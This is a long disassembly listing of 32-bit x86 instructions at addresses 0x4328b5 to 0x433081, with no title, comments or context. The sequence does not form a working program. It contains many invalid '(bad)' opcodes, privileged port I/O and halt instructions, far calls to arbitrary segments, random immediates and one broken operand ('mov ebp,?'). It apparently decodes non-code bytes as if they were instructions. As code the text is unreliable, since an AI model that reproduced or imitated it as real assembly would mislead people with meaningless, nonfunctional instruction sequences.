  4328b5:	mov    edx,0xa44261fe
  4328ba:	into   
  4328bb:	les    ecx,FWORD PTR [ebx+ebx*4]
  4328be:	(bad)  
  4328bf:	aas    
  4328c0:	xchg   ebp,eax
  4328c1:	mov    al,ds:0x1a2fc2fb
  4328c6:	mov    DWORD PTR [esi+0x3a1cf73f],0x4db77933
  4328d0:	sub    al,BYTE PTR [edx-0x9dd00f5]
  4328d6:	scas   eax,DWORD PTR es:[edi]
  4328d7:	xor    edi,esi
  4328d9:	add    esi,ebp
  4328db:	fisttp WORD PTR [edx+0x52]
  4328de:	call   0x20fa:0xa18381ce
  4328e5:	push   edi
  4328e6:	xchg   edx,eax
  4328e7:	pop    eax
  4328e8:	or     bl,BYTE PTR [edx-0x66c7dc45]
  4328ee:	adc    BYTE PTR [ecx-0x5feabadb],bl
  4328f4:	jmp    0xa7d80b88
  4328f9:	and    eax,0x9d2be625
  4328fe:	mov    ebx,0x9ebf672c
  432903:	test   eax,0x65f5726f
  432908:	jo     0x43295b
  43290a:	mov    esp,0x11774644
  43290f:	pop    ss
  432910:	pop    ds
  432911:	and    ch,ch
  432913:	in     eax,dx
  432914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432915:	pop    ss
  432916:	int    0xe4
  432918:	(bad)  
  43291a:	push   ecx
  43291b:	push   eax
  43291c:	mov    eax,ds:0x679e2652
  432921:	pushf  
  432922:	mov    cl,0x74
  432924:	mov    ch,0x5d
  432926:	int    0x33
  432928:	cmc    
  432929:	rcl    DWORD PTR [ecx],cl
  43292b:	out    dx,eax
  43292c:	cld    
  43292d:	xchg   ebp,eax
  43292e:	es push ecx
  432930:	and    ebx,esi
  432932:	xchg   ecx,eax
  432933:	pop    edx
  432934:	dec    ecx
  432935:	pop    ecx
  432936:	enter  0x71bf,0x31
  43293a:	pop    ebp
  43293b:	and    eax,0xe6af8cbf
  432940:	adc    eax,0x77ebacbd
  432945:	or     DWORD PTR [edi+0x24],eax
  432948:	xchg   edx,eax
  432949:	mov    ecx,0x9bf15fa9
  43294e:	mov    ebp,?
  432950:	mov    eax,0xb5f9b4c9
  432955:	push   edi
  432956:	sbb    al,0xee
  432958:	jge    0x43290e
  43295a:	test   BYTE PTR [edx+ecx*1-0x31e3546],dl
  432961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432962:	push   ecx
  432963:	inc    esp
  432964:	add    DWORD PTR ds:0xdc05b885,ecx
  43296a:	(bad)  
  43296c:	mov    ds:0xa1eb4af0,eax
  432971:	xchg   edi,eax
  432972:	mov    DWORD PTR [ebp+0x67],edx
  432975:	jecxz  0x432936
  432977:	hlt    
  432978:	shr    BYTE PTR [edx-0x7c698e8f],cl
  43297e:	pop    esi
  43297f:	push   edi
  432980:	aaa    
  432981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432982:	xchg   esi,eax
  432983:	push   edx
  432984:	push   es
  432985:	add    al,0xa1
  432987:	loopne 0x432943
  432989:	ds mov al,0x4
  43298c:	cwde   
  43298d:	stos   DWORD PTR es:[edi],eax
  43298e:	cli    
  43298f:	push   cs
  432990:	push   es
  432991:	cdq    
  432992:	sub    BYTE PTR [edi],dh
  432994:	push   edi
  432995:	lahf   
  432996:	jmp    0x4329d3
  432998:	dec    esi
  432999:	ficom  DWORD PTR [edx+0x10294d11]
  43299f:	dec    edx
  4329a0:	fs jecxz 0x432962
  4329a3:	cmc    
  4329a4:	mov    ah,0x57
  4329a6:	push   ecx
  4329a7:	push   0xfcb29de5
  4329ac:	sub    eax,0x63b1e11e
  4329b1:	loope  0x4329cd
  4329b3:	test   eax,0x4528450f
  4329b8:	push   ss
  4329b9:	adc    cl,ah
  4329bb:	scas   eax,DWORD PTR es:[edi]
  4329bc:	sub    bl,BYTE PTR [ebp-0x15541755]
  4329c2:	jp     0x432a0d
  4329c4:	fiadd  DWORD PTR [eax+0x72d0624e]
  4329ca:	mov    al,0x84
  4329cc:	in     eax,dx
  4329cd:	clc    
  4329ce:	rcl    DWORD PTR [ebp-0x6a],cl
  4329d1:	add    ebp,ebp
  4329d3:	xor    ecx,DWORD PTR [esi-0x5c]
  4329d6:	repz (bad) 
  4329d8:	mov    ecx,0x56f9443c
  4329dd:	int3   
  4329de:	imul   esp,ebp,0xffffffdd
  4329e1:	mov    dh,0xa7
  4329e3:	jmp    0x432a3c
  4329e5:	mov    ds:0x8b972ceb,eax
  4329ea:	xor    eax,DWORD PTR [edx+0x6f]
  4329ed:	pushf  
  4329ee:	inc    edi
  4329ef:	ret    
  4329f0:	stc    
  4329f1:	(bad)  
  4329f2:	retf   
  4329f3:	hlt    
  4329f4:	ja     0x4329bf
  4329f6:	call   0x81b6:0xbbd1d012
  4329fd:	push   esi
  4329fe:	cld    
  4329ff:	or     al,0x23
  432a01:	es ja  0x432a0f
  432a04:	int    0x79
  432a06:	vcvtdq2ps xmm5,XMMWORD PTR [eax+0x429d6a63]
  432a0e:	jae    0x432a1f
  432a10:	xchg   DWORD PTR [ecx-0x44],esp
  432a13:	mov    esi,0xb35c8938
  432a18:	sbb    BYTE PTR [ecx-0x14],ch
  432a1b:	sub    al,0x3a
  432a1d:	stc    
  432a1e:	dec    esp
  432a1f:	test   eax,edi
  432a21:	pop    esp
  432a22:	mov    bl,0x14
  432a24:	fcom   DWORD PTR [edi]
  432a26:	sbb    DWORD PTR [ecx-0x17fd51fb],0x48e37986
  432a30:	pop    ds
  432a31:	sbb    DWORD PTR [ecx-0x31adc38a],eax
  432a37:	sbb    al,0xdc
  432a39:	or     al,0x6c
  432a3b:	pop    esi
  432a3c:	and    al,0xf6
  432a3e:	pop    es
  432a3f:	xor    eax,0xe83934ed
  432a44:	xor    al,0xa9
  432a46:	inc    esp
  432a47:	xchg   esp,eax
  432a48:	xlat   BYTE PTR ds:[ebx]
  432a49:	mov    esi,0x5c222b5d
  432a4e:	mov    esp,0xab996d82
  432a53:	adc    bl,BYTE PTR [edi+0x1d]
  432a56:	inc    ecx
  432a57:	stos   BYTE PTR es:[edi],al
  432a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432a59:	daa    
  432a5a:	pop    ebx
  432a5b:	push   ebx
  432a5c:	outs   dx,DWORD PTR ds:[esi]
  432a5d:	stos   BYTE PTR es:[edi],al
  432a5e:	mov    cl,0x84
  432a60:	repnz sub BYTE PTR [eax],ch
  432a63:	iret   
  432a64:	and    eax,0x51f90745
  432a69:	mov    ch,0xf5
  432a6b:	arpl   dx,si
  432a6d:	outs   dx,BYTE PTR ds:[esi]
  432a6e:	and    eax,0xbc638674
  432a73:	xor    al,0x31
  432a75:	into   
  432a76:	mov    al,0x9e
  432a78:	adc    eax,0x6e8d474
  432a7d:	add    eax,0xaee18bf6
  432a82:	pop    ebx
  432a83:	addr16 inc ebp
  432a85:	jecxz  0x432a42
  432a87:	call   0xd20e719c
  432a8c:	cmp    BYTE PTR [ebx],ch
  432a8e:	or     ch,BYTE PTR [eax]
  432a90:	xchg   ebp,eax
  432a91:	push   edx
  432a92:	mov    esp,0xa4feb0eb
  432a97:	cwde   
  432a98:	adc    ebp,DWORD PTR [edx]
  432a9a:	mov    ch,0x44
  432a9c:	pop    ebx
  432a9d:	lahf   
  432a9e:	mov    DWORD PTR ds:0xf02e53f5,esp
  432aa4:	pushf  
  432aa5:	ins    DWORD PTR es:[edi],dx
  432aa6:	mov    esi,0x63e91fa1
  432aab:	leave  
  432aac:	push   esp
  432aad:	stc    
  432aae:	cs popa 
  432ab0:	rol    BYTE PTR [edi+0x6579945e],0xaf
  432ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432ab8:	inc    ecx
  432ab9:	loopne 0x432a6f
  432abb:	sub    al,0x43
  432abd:	or     eax,0x297d968
  432ac2:	sub    ch,dl
  432ac4:	and    ah,dh
  432ac6:	gs sbb eax,0x201c119b
  432acc:	sub    al,0xa3
  432ace:	cld    
  432acf:	sub    ecx,DWORD PTR [ecx+ebx*1+0x6b]
  432ad3:	clc    
  432ad4:	in     al,0xc9
  432ad6:	outs   dx,DWORD PTR ds:[esi]
  432ad7:	out    dx,al
  432ad8:	adc    al,0xa0
  432ada:	arpl   WORD PTR [eax-0x3f],di
  432add:	jle    0x432a62
  432adf:	or     al,0x89
  432ae1:	sahf   
  432ae2:	cmp    ecx,DWORD PTR [esi+0x2c]
  432ae5:	add    dl,dl
  432ae7:	pop    ebp
  432ae8:	sbb    ch,dl
  432aea:	inc    edx
  432aeb:	mov    edx,0x8bbde921
  432af0:	mul    DWORD PTR [esi-0x5ebe2cd1]
  432af6:	pop    ebx
  432af7:	jne    0x432acd
  432af9:	call   0xfe75:0x74131e0d
  432b00:	cmp    al,0xc2
  432b02:	mov    eax,0x5c5600b4
  432b07:	icebp  
  432b08:	mov    ecx,0x217efc36
  432b0d:	cmp    DWORD PTR [edx-0x6c808b8],ebp
  432b13:	and    ebp,DWORD PTR [ecx]
  432b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432b16:	mov    al,dl
  432b18:	sbb    DWORD PTR [ecx],edi
  432b1a:	rcl    DWORD PTR [ebp-0x5f144601],cl
  432b20:	cmp    eax,0xde1adb9c
  432b25:	mov    ebp,0xce091589
  432b2a:	rcr    BYTE PTR [ebx+0x47],0x22
  432b2e:	mov    ebx,0x5992f424
  432b33:	and    ebp,esp
  432b35:	pop    es
  432b36:	fwait
  432b37:	hlt    
  432b38:	mov    BYTE PTR [esi],al
  432b3a:	push   edx
  432b3b:	mov    dl,0x17
  432b3d:	leave  
  432b3e:	ror    edx,1
  432b40:	lds    ecx,FWORD PTR [esi+0xf]
  432b43:	fs ins DWORD PTR es:[edi],dx
  432b45:	dec    bp
  432b47:	push   ebp
  432b48:	and    DWORD PTR [eax-0x35738fad],0x39199b7c
  432b52:	push   edx
  432b53:	dec    eax
  432b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432b55:	jb     0x432b47
  432b57:	bound  sp,DWORD PTR [ecx+0x461b3d6b]
  432b5e:	or     eax,0xa8d4cb6e
  432b63:	mov    ecx,DWORD PTR [ebx-0x22ba6338]
  432b69:	mov    cl,0xa8
  432b6b:	out    0x21,eax
  432b6d:	fwait
  432b6e:	fwait
  432b6f:	add    eax,0x8116658d
  432b74:	outs   dx,DWORD PTR ds:[esi]
  432b75:	sbb    eax,0x80241bee
  432b7a:	mov    bl,0x63
  432b7c:	scas   eax,DWORD PTR es:[edi]
  432b7d:	sahf   
  432b7e:	cmp    ebp,eax
  432b80:	es and eax,0xbff6d55d
  432b86:	dec    ebx
  432b87:	test   eax,0xaa24487f
  432b8c:	and    al,0xc5
  432b8e:	push   0xffffff90
  432b90:	and    eax,0xa80e1cc9
  432b95:	adc    eax,0xa012bfbc
  432b9a:	jnp    0x432b45
  432b9c:	enter  0x72dd,0xee
  432ba0:	(bad)
  432ba4:	pop    edi
  432ba5:	cmp    BYTE PTR [ebx],ah
  432ba7:	add    eax,0x755bf316
  432bac:	mov    eax,ds:0xb1cadba6
  432bb1:	sub    ch,cl
  432bb3:	and    eax,DWORD PTR [esi+ebp*8+0x3e]
  432bb7:	jg     0x432bea
  432bb9:	xchg   edi,eax
  432bba:	mov    cl,0xf4
  432bbc:	pop    edi
  432bbd:	or     DWORD PTR [ebx+0x29cf75c9],esp
  432bc3:	out    0xad,eax
  432bc5:	imul   edi,DWORD PTR ds:0x6cd917ca,0x11
  432bcc:	jl     0x432c46
  432bce:	mov    esp,ecx
  432bd0:	fldenv [ebx+0x7c92c24b]
  432bd6:	jmp    0x4ed3a053
  432bdb:	sahf   
  432bdc:	xor    BYTE PTR [ebp-0x4ca11b1a],al
  432be2:	lds    edi,FWORD PTR ds:0x6f4de6e0
  432be8:	cmc    
  432be9:	dec    edx
  432bea:	loopne 0x432bd1
  432bec:	test   al,0xd
  432bee:	jne    0x432c2f
  432bf0:	and    DWORD PTR [ecx+0x18338ec2],ebp
  432bf6:	xchg   BYTE PTR [ebx+edx*1+0x27],cl
  432bfa:	mov    esi,DWORD PTR [ebx+0x77]
  432bfd:	mov    DWORD PTR [ecx],0xf0d865c2
  432c03:	in     eax,dx
  432c04:	aam    0xce
  432c06:	bound  edx,QWORD PTR [esi]
  432c08:	pop    eax
  432c09:	retf   
  432c0a:	mov    bl,0xa4
  432c0c:	jnp    0x432c6f
  432c0e:	pop    edx
  432c0f:	fs add eax,0x6fe72791
  432c15:	push   esi
  432c16:	xor    al,0x7c
  432c18:	push   edx
  432c19:	stc    
  432c1a:	pop    ecx
  432c1b:	push   ebx
  432c1d:	loopne 0x432c10
  432c1f:	sti    
  432c20:	ficom  WORD PTR [eax]
  432c22:	pop    esi
  432c23:	jns    0x432c3f
  432c25:	or     al,0xbc
  432c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c28:	leave  
  432c29:	fdiv   QWORD PTR [esi*4-0x10289bae]
  432c30:	and    ecx,ebp
  432c32:	xchg   esi,eax
  432c33:	xor    BYTE PTR [ecx-0x48],bl
  432c36:	cmp    DWORD PTR [esi-0x28],edx
  432c39:	mov    ds:0xc1dd123b,eax
  432c3e:	mov    ebx,0xc4f053aa
  432c43:	mov    ah,0xf7
  432c45:	ret    0x24bc
  432c48:	es pop esi
  432c4a:	int    0x90
  432c4c:	out    0x58,al
  432c4e:	sbb    ecx,DWORD PTR ds:0xa006e20
  432c54:	xor    eax,0x28549769
  432c59:	jnp    0x432be7
  432c5b:	bound  ebx,QWORD PTR [edx+eax*4-0x4d]
  432c5f:	inc    eax
  432c60:	(bad)  
  432c61:	ss dec esp
  432c63:	shl    BYTE PTR [ebx],cl
  432c65:	popa   
  432c66:	ja     0x432bf4
  432c68:	push   0xcd6965e6
  432c6d:	iret   
  432c6e:	in     eax,dx
  432c6f:	mov    ch,0xe2
  432c71:	dec    esi
  432c72:	mov    esi,0xb3152f84
  432c77:	(bad)  
  432c78:	retf   
  432c79:	add    BYTE PTR [ebp-0x52],dh
  432c7c:	pop    ds
  432c7d:	or     dh,BYTE PTR [esi+0x423e7084]
  432c83:	in     al,0xd
  432c85:	lahf   
  432c86:	les    esp,FWORD PTR [eax+eax*1]
  432c89:	xchg   BYTE PTR [edi+0x74],dl
  432c8c:	(bad)  
  432c8d:	call   0xdfd1:0xe27aeabb
  432c94:	sahf   
  432c95:	sbb    eax,0x55063f4f
  432c9a:	mov    al,ds:0xf78372d5
  432c9f:	loope  0x432ce7
  432ca1:	adc    eax,0x95b0a4b5
  432ca6:	repz push eax
  432ca8:	xchg   BYTE PTR [ebp-0x64f2f775],dh
  432cae:	xor    esi,DWORD PTR cs:[ebp-0x1b]
  432cb2:	retf   0x2b4a
  432cb5:	cdq    
  432cb6:	xchg   ebx,eax
  432cb7:	aam    0xf7
  432cb9:	dec    ebp
  432cba:	rcr    BYTE PTR [ebp-0x45ea4e1],1
  432cc0:	cmc    
  432cc1:	mov    dl,0x50
  432cc3:	jmp    0x432ca3
  432cc5:	in     al,dx
  432cc6:	adc    DWORD PTR [ecx+0x21],0xf20c0759
  432ccd:	cmp    cl,0x63
  432cd0:	sti    
  432cd1:	popf   
  432cd2:	retf   
  432cd3:	aaa    
  432cd4:	ret    0xe9df
  432cd7:	xchg   BYTE PTR [esi-0x15181d3f],dl
  432cdd:	ja     0x432cf2
  432cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432ce0:	jmp    0x432d41
  432ce2:	cs xchg ebp,eax
  432ce4:	sbb    DWORD PTR [esi+eiz*8],esp
  432ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432ce8:	inc    ebp
  432ce9:	popf   
  432cea:	(bad)  [eax-0x1e]
  432ced:	jp     0x432d16
  432cef:	jle    0x432d2f
  432cf1:	retf   
  432cf2:	xlat   BYTE PTR ds:[ebx]
  432cf3:	jne    0x432ce5
  432cf5:	dec    esi
  432cf6:	out    dx,eax
  432cf7:	je     0x432d53
  432cf9:	push   ds
  432cfa:	push   0xffffff95
  432cfc:	(bad)  
  432cfd:	pop    ebp
  432cfe:	(bad)  
  432cff:	aam    0xe2
  432d01:	or     ch,BYTE PTR [esi]
  432d03:	in     al,dx
  432d04:	in     eax,dx
  432d05:	(bad)
  432d08:	iret   
  432d09:	add    BYTE PTR [esp+ebx*1-0xb4aef07],bh
  432d10:	dec    ebp
  432d11:	mov    al,0x8a
  432d13:	mov    dl,ch
  432d15:	or     BYTE PTR [edx-0xf],dh
  432d18:	not    DWORD PTR [edi+esi*1]
  432d1b:	out    dx,al
  432d1c:	sbb    DWORD PTR [ecx-0x6e],ecx
  432d1f:	test   al,0xb2
  432d21:	leave  
  432d22:	add    esp,0x50
  432d25:	pushf  
  432d26:	sti    
  432d27:	mov    esp,0xa9e07a5b
  432d2c:	xchg   BYTE PTR [esi],dl
  432d2e:	mov    edx,0xb9a246fb
  432d33:	jmp    0x73adfc5c
  432d38:	sbb    al,0x69
  432d3a:	adc    bl,ah
  432d3c:	mov    al,0x9e
  432d3e:	out    dx,eax
  432d3f:	mov    ah,0xd6
  432d41:	(bad)
  432d44:	pusha  
  432d45:	cmova  edx,DWORD PTR [ecx+0x5c52451d]
  432d4c:	in     al,0x2a
  432d4e:	add    dh,BYTE PTR [ebx+0x18]
  432d51:	jne    0x432cf6
  432d53:	ins    BYTE PTR es:[edi],dx
  432d54:	repz dec esp
  432d56:	adc    ah,al
  432d58:	test   eax,0x23817480
  432d5d:	jns    0x432d96
  432d5f:	jno    0x432cfb
  432d61:	cmp    eax,0xeaecbaa8
  432d66:	mov    dh,0x31
  432d68:	scas   al,BYTE PTR es:[edi]
  432d69:	test   al,0xb
  432d6b:	cli    
  432d6c:	pop    es
  432d6d:	and    esi,ebx
  432d6f:	inc    ebx
  432d70:	mov    eax,ds:0xd6242ba4
  432d75:	test   edi,edx
  432d77:	adc    ebx,esp
  432d79:	iret   
  432d7a:	ds adc eax,0xf38f7a91
  432d80:	ret    
  432d81:	sar    DWORD PTR [ebp+0x3239e064],1
  432d87:	lock inc esi
  432d89:	adc    BYTE PTR [ebx],dl
  432d8b:	fucomi st,st(7)
  432d8d:	sahf   
  432d8e:	xor    DWORD PTR [edi+0x54],0x47
  432d92:	xlat   BYTE PTR ds:[ebx]
  432d93:	out    dx,al
  432d94:	sbb    ch,cl
  432d96:	adc    DWORD PTR [ebx+eiz*2-0x31b8083f],edx
  432d9d:	cmp    bh,BYTE PTR [edx+0x537aa51d]
  432da3:	out    0xf8,eax
  432da5:	(bad)  
  432da6:	jns    0x432d86
  432da8:	fimul  DWORD PTR [eax-0x3]
  432dab:	jae    0x432db6
  432dad:	sub    BYTE PTR [esi-0x62b2179c],bh
  432db3:	pop    ebp
  432db4:	lds    edi,FWORD PTR [esi+0x5b]
  432db7:	call   0xb24b59cf
  432dbc:	sbb    cl,cl
  432dbe:	push   cs
  432dbf:	sbb    eax,0x61dce131
  432dc4:	ins    DWORD PTR es:[edi],dx
  432dc5:	xchg   edi,eax
  432dc6:	mov    bl,0x27
  432dc8:	lds    ebx,FWORD PTR [edi]
  432dca:	(bad)  
  432dcb:	call   0x45705e24
  432dd0:	sbb    DWORD PTR [ecx+0x3a],edi
  432dd3:	mov    gs:0xe68cae81,al
  432dd9:	rcr    DWORD PTR [ebx-0x2a],cl
  432ddc:	das    
  432ddd:	lods   al,BYTE PTR ds:[esi]
  432dde:	or     DWORD PTR [edx+0x1fcc630c],eax
  432de4:	sbb    eax,0xb1d9f979
  432de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432dea:	and    dh,bl
  432dec:	rcl    DWORD PTR [ebx-0x74],0x81
  432df0:	or     DWORD PTR [edx+0x5728c6c7],ebx
  432df6:	mov    edx,0xe10922e4
  432dfb:	fwait
  432dfc:	je     0x432e3d
  432dfe:	repz inc edx
  432e00:	inc    ebp
  432e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e02:	stos   DWORD PTR es:[edi],eax
  432e03:	push   ds
  432e04:	in     eax,dx
  432e05:	pop    ebp
  432e06:	or     esp,ebx
  432e08:	xchg   edi,eax
  432e09:	adc    eax,0xee1cb679
  432e0e:	mov    edi,0x79db0674
  432e13:	mov    ebp,0x62bb9c0d
  432e18:	mov    eax,ds:0xf5249f00
  432e1d:	sub    eax,DWORD PTR [edi+0x2a56e76f]
  432e23:	lds    ebp,FWORD PTR [ebx]
  432e25:	ret    
  432e26:	sub    eax,0xc8f01e21
  432e2b:	mov    ch,0xd
  432e2d:	sbb    BYTE PTR [ecx+eiz*4+0x5d7d4287],bl
  432e34:	sbb    bl,BYTE PTR [ecx+edi*4-0x1b]
  432e38:	and    BYTE PTR [ecx+0x4be741a],bl
  432e3e:	pop    eax
  432e3f:	fldcw  WORD PTR [ecx-0x71]
  432e42:	rcl    DWORD PTR [edx*2-0x630ff48f],cl
  432e49:	ja     0x432e67
  432e4b:	and    BYTE PTR [ecx+ebp*4],ah
  432e4e:	inc    ecx
  432e4f:	aaa    
  432e50:	mov    bh,0x5f
  432e52:	repnz leave 
  432e54:	outs   dx,DWORD PTR ds:[esi]
  432e55:	cdq    
  432e56:	fistp  DWORD PTR [ecx+eiz*4+0x14a2951f]
  432e5d:	(bad)  
  432e5e:	stos   DWORD PTR es:[edi],eax
  432e5f:	(bad)  
  432e61:	sbb    esp,esi
  432e63:	xor    al,0xd9
  432e65:	cdq    
  432e66:	not    DWORD PTR [edx]
  432e68:	outs   dx,BYTE PTR ds:[esi]
  432e69:	into   
  432e6a:	sub    eax,DWORD PTR [ebp-0x80]
  432e6d:	mov    dl,0xc9
  432e6f:	mov    bl,0x2c
  432e71:	popfw  
  432e73:	rcl    edx,1
  432e75:	jne    0x432e8d
  432e77:	jo     0x432e6b
  432e79:	lock mov edx,0x70351bb4
  432e7f:	rol    ebp,1
  432e81:	cmp    DWORD PTR [ecx*4-0x2e4ca348],0x8cb67656
  432e8c:	pop    ss
  432e8d:	leave  
  432e8e:	(bad)  
  432e90:	stos   BYTE PTR es:[edi],al
  432e91:	and    al,0x79
  432e93:	jmp    0x432e6d
  432e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e96:	sub    edi,DWORD PTR [eax]
  432e98:	mov    dh,0xea
  432e9a:	test   esi,edi
  432e9c:	ins    DWORD PTR es:[edi],dx
  432e9d:	push   esp
  432e9e:	leave  
  432e9f:	mov    gs,WORD PTR [edi]
  432ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432ea2:	jmp    0x941b65bb
  432ea7:	mov    ebp,0x844275c3
  432eac:	pop    ecx
  432ead:	sbb    edi,edi
  432eaf:	jb     0x432ecc
  432eb1:	popa   
  432eb2:	pop    DWORD PTR [ebx+0xeaca080]
  432eb8:	cs dec ecx
  432eba:	fcmovne st,st(2)
  432ebc:	(bad)  
  432ebd:	push   ds
  432ebe:	mov    ds:0x1b789a20,al
  432ec3:	stc    
  432ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432ec5:	fwait
  432ec6:	and    DWORD PTR [ebx],esp
  432ec8:	loopne 0x432ea3
  432eca:	cmp    esi,DWORD PTR [ebx+0x12c39ed0]
  432ed0:	ret    0xbe06
  432ed3:	arpl   WORD PTR [edx-0xa],ax
  432ed6:	pop    ebx
  432ed7:	and    al,0x8c
  432ed9:	repz std 
  432edb:	(bad)  
  432edd:	jl     0x432e63
  432edf:	in     eax,dx
  432ee0:	and    al,0x9
  432ee2:	lock pop es
  432ee4:	push   0xfee9e7be
  432ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432eea:	jnp    0x432f23
  432eec:	mov    edx,0x364a9283
  432ef1:	cmp    DWORD PTR ds:0x3d0b6d67,ebx
  432ef7:	sbb    ah,BYTE PTR [eax]
  432ef9:	pop    ecx
  432efa:	clc    
  432efb:	or     eax,0x7b8d2c48
  432f00:	test   DWORD PTR [esi-0x8],edi
  432f03:	repz mov dl,al
  432f06:	add    eax,0x983add06
  432f0b:	retf   0x4d17
  432f0e:	fsub   st(1),st
  432f10:	adc    bh,BYTE PTR [esi+ebx*8+0x54c8c5f6]
  432f17:	out    dx,al
  432f18:	sahf   
  432f19:	stos   BYTE PTR es:[edi],al
  432f1a:	and    DWORD PTR [eax+0x21],ebx
  432f1d:	test   eax,0x9f5661aa
  432f22:	inc    eax
  432f23:	aam    0xd4
  432f25:	mov    ds:0x302694e9,al
  432f2a:	mov    ebp,0xd40cc731
  432f2f:	xchg   edx,eax
  432f30:	and    dh,bh
  432f32:	mov    esi,0x4b23a316
  432f37:	arpl   si,di
  432f39:	dec    eax
  432f3a:	aam    0xe
  432f3c:	cmc    
  432f3d:	out    dx,al
  432f3e:	das    
  432f3f:	inc    ebp
  432f40:	pop    ds
  432f41:	jle    0x432f81
  432f43:	and    DWORD PTR [edx-0x60],eax
  432f46:	sbb    esi,DWORD PTR [ebp-0x6e]
  432f49:	out    dx,al
  432f4a:	loopne 0x432ed8
  432f4c:	aad    0xfb
  432f4e:	cmp    esp,edi
  432f50:	jmp    0x77f8ceda
  432f55:	pop    esp
  432f56:	call   0x2c0bb041
  432f5b:	pop    ecx
  432f5c:	mov    ch,0xe4
  432f5e:	push   0xd07d17cf
  432f63:	xchg   edi,eax
  432f64:	pop    ds
  432f65:	imul   esp,DWORD PTR [eax+0x3d611ca1],0xaf5655d2
  432f6f:	mov    ch,0x23
  432f71:	stc    
  432f72:	mov    edi,0x78f05d32
  432f77:	and    DWORD PTR [eax-0x743ab2d7],edx
  432f7d:	push   0xfffffff0
  432f7f:	nop
  432f80:	pop    ss
  432f81:	les    esp,FWORD PTR [ecx]
  432f83:	xor    eax,0x910ba224
  432f88:	fstp   TBYTE PTR [edx+0xa214e73]
  432f8e:	dec    edi
  432f8f:	repz cli 
  432f91:	cwde   
  432f92:	mov    al,0x64
  432f94:	in     eax,0x9
  432f96:	or     DWORD PTR [eax-0x7b],edi
  432f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432f9a:	loop   0x432f83
  432f9c:	es sub eax,0x6a128390
  432fa2:	xlat   BYTE PTR ds:[ebx]
  432fa3:	int    0xdb
  432fa5:	mov    ds:0xb769a8d,eax
  432faa:	stos   DWORD PTR es:[edi],eax
  432fab:	repnz cdq 
  432fad:	jg     0x432fcf
  432faf:	retf   
  432fb0:	sbb    bl,BYTE PTR [ecx+0x57c92132]
  432fb6:	inc    edi
  432fb7:	xchg   DWORD PTR [esi],ebp
  432fb9:	sbb    edi,eax
  432fbb:	jo     0x432fe5
  432fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432fbe:	sub    ah,cl
  432fc0:	and    ebp,eax
  432fc2:	out    dx,eax
  432fc3:	scas   eax,DWORD PTR es:[edi]
  432fc4:	xor    eax,0xd4fbab92
  432fc9:	out    0x2,eax
  432fcb:	pop    es
  432fcc:	sub    al,0x72
  432fce:	jmp    0x4f75:0x7a8d06ea
  432fd5:	arpl   WORD PTR [ebp-0x36],bp
  432fd8:	arpl   WORD PTR [ebp-0x668e66b9],sp
  432fde:	lods   al,BYTE PTR ds:[esi]
  432fdf:	ja     0x432ffa
  432fe1:	cmp    DWORD PTR [edi],eax
  432fe3:	add    ebp,DWORD PTR [edi-0x54]
  432fe6:	retf   0x6f18
  432fe9:	mov    dh,0xdb
  432feb:	ss pop ebp
  432fed:	cld    
  432fee:	stc    
  432fef:	xor    esp,eax
  432ff1:	data16 cli 
  432ff3:	fist   WORD PTR [esi]
  432ff5:	cdq    
  432ff6:	xchg   edi,eax
  432ff7:	push   ebp
  432ff8:	fucomip st,st(2)
  432ffa:	mov    bl,0xb9
  432ffc:	shl    DWORD PTR [esi-0x36ef9ef5],cl
  433002:	and    al,BYTE PTR [ecx+0x2e]
  433005:	dec    edi
  433006:	mov    esp,0xef7650ba
  43300b:	adc    al,0xb
  43300d:	lahf   
  43300e:	ret    
  43300f:	adc    ah,BYTE PTR [edi-0x61]
  433012:	in     al,0x65
  433014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433015:	add    dh,BYTE PTR [eax]
  433017:	or     ebx,edx
  433019:	push   edx
  43301a:	sbb    eax,0xe7741dc2
  43301f:	sbb    ah,BYTE PTR [ecx]
  433021:	imul   ebx,DWORD PTR [ebp-0x1d98d74e],0xfc795d87
  43302b:	sub    al,0x2d
  43302d:	lods   al,BYTE PTR ds:[esi]
  43302e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43302f:	add    BYTE PTR [esi+0x2016b105],0xf9
  433036:	or     edx,DWORD PTR [edi+ebp*8+0x36]
  43303a:	mov    dl,0x39
  43303c:	jl     0x432fc0
  43303e:	sbb    dh,al
  433040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433041:	jo     0x43302b
  433043:	in     al,dx
  433044:	into   
  433045:	mov    al,ds:0x91a5696
  43304a:	adc    BYTE PTR [ecx+ebp*1+0x2],ch
  43304e:	xchg   edi,eax
  43304f:	jle    0x433019
  433051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433052:	sbb    edi,ebx
  433054:	cmovns ecx,DWORD PTR [ebp-0x72]
  433058:	xchg   esp,eax
  433059:	je     0x433026
  43305b:	ss cmp ch,al
  43305e:	outs   dx,DWORD PTR ds:[esi]
  43305f:	jne    0x4330b6
  433061:	jge    0x433004
  433063:	repnz aam 0x8c
  433066:	mov    esp,0x9f9a7e63
  43306b:	add    eax,0x74b4a8fd
  433070:	iret   
  433071:	leave  
  433072:	ror    DWORD PTR [ecx-0x7a],0x99
  433076:	pop    ebx
  433077:	dec    edx
  433078:	xor    BYTE PTR [ebp+0x74],cl
  43307b:	pop    edi
  43307c:	add    eax,0x17f46823
  433081:	std    
